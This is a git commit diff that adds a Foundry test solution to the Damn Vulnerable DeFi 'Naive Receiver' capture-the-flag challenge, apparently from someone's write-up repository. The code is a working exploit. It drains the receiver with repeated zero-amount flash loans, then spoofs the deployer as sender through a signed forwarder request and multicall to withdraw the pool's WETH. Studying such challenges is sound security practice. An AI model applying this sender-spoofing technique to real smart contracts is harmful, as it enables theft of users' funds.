b2a5cc8d8c6d14658d726e06222f8459fa2ceadc
SunWeb3Sec <107249780+SunWeb3Sec@users.noreply.github.com>
2024-08-31 00:27:06 +0800

    Add files via upload

--- Writeup/SunSec/damn-vulnerable-defi/test/naive-receiver/NaiveReceiver.t.sol
+++ Writeup/SunSec/damn-vulnerable-defi/test/naive-receiver/NaiveReceiver.t.sol
@@ -77,9 +77,35 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        pool.flashLoan(receiver,address(weth),102e18,"0x");
-        //console.log("receiver balance",weth.balanceOf(address(receiver)));
-        //console.log("receiver balance",weth.balanceOf(address(pool)));
+        bytes[] memory callDatas = new bytes[](11);
+        for(uint i=0; i<10; i++){
+            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
+        }
+        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            bytes32(uint256(uint160(deployer)))
+        );
+        bytes memory callData;
+        callData = abi.encodeCall(pool.multicall, callDatas);
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,
+            address(pool),
+            0,
+            gasleft(),
+            forwarder.nonces(player),
+            callData,
+            1 days
+        );
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
     }
 
     /**
